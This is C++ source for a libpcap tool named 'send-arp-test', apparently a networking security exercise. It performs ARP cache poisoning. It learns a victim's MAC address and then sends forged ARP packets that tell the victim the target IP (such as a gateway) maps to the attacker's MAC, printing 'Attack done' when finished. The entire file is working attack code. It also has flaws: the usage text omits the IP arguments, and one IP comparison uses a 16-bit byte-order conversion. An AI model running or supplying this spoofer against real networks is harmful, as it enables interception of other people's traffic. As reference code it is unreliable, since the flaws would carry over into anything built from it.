#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <errno.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int getIPAddress(uint32_t *ip_addr, char* dev) {
	int sock;
	struct ifreq ifr;
	struct sockaddr_in *sin;
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		return 0;
	}
	strcpy(ifr.ifr_name, dev);
	if (ioctl(sock, SIOCGIFADDR, &ifr)< 0) {
		close(sock);
		return 0;
	}
	sin = (struct sockaddr_in*)&ifr.ifr_addr;
	*ip_addr = htonl(sin->sin_addr.s_addr);
	close(sock);
	return 1;
}

int getMacAddress(uint8_t *mac, char* dev) {
	int sock;
	struct ifreq ifr;	
	char mac_adr[18] = {0,};		
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {		
		return 0;
	}	
	strcpy(ifr.ifr_name, dev);
	if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0) {
		close(sock);
		return 0;
	}
	for(int i=0; i<6; i++) {
		mac[i] = ((uint8_t*)ifr.ifr_hwaddr.sa_data)[i];
	}
	close(sock);
	return 1;
}

void print_Mac(Mac mac) {
	printf("%02X:%02X:%02X:%02X:%02X:%02X", ((uint8_t*)mac)[0], ((uint8_t*)mac)[1], ((uint8_t*)mac)[2], ((uint8_t*)mac)[3], ((uint8_t*)mac)[4], ((uint8_t*)mac)[5]);
}

int main(int argc, char* argv[]) {
	if (argc == 2 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	uint8_t mac[6] = {0,};
	Mac atk_mac;
	
	getMacAddress(mac, dev);
	atk_mac = Mac(mac);
	
	printf("Attacker Mac: ");
	print_Mac(atk_mac);
	printf("\n");
	
	uint32_t atk_ip;
	
	getIPAddress(&atk_ip, dev);
	
	EthArpPacket packet;
	uint32_t s_ip;
	uint32_t t_ip;
	
	for(int i=2;i < argc;i += 2){
		s_ip = Ip((argv[i]));
		t_ip = Ip((argv[i + 1]));
		Mac s_mac;
	
		printf("\nSender Ip: %s\nTarget Ip: %s\n", argv[i], argv[i+1]);
		
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = atk_mac;
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = atk_mac;
		packet.arp_.sip_ = htonl(Ip(atk_ip));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(s_ip));
	
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		
		struct pcap_pkthdr* header;
		const u_char* pkt;
		while(1){
			int res = pcap_next_ex(handle, &header, &pkt);
			if(res == 0) continue;
			if(res == -1 || res == -2){
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}
			EthArpPacket* ea_pkt = (EthArpPacket*)pkt;
			if(ntohs(ea_pkt->arp_.op_) != ArpHdr::Reply) continue;
			if(ntohl(ea_pkt->arp_.sip_) != s_ip) continue;
			if(ntohs(ea_pkt->arp_.tip_) != atk_ip) continue;
			if(memcmp(((uint8_t*)(ea_pkt->arp_.tmac_)), ((uint8_t*)atk_mac), 6) != 0) continue;
			s_mac = Mac(ea_pkt->arp_.smac_);
			break;
		}
		
		printf("Sender Mac: ");
		print_Mac(s_mac);
		printf("\n");
		
		packet.eth_.dmac_ = s_mac;
		packet.arp_.sip_ = htonl(Ip(t_ip));
		packet.arp_.tmac_ = s_mac;
		
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		else{
			printf("Attack done\n");
		}
	}
	pcap_close(handle);
}
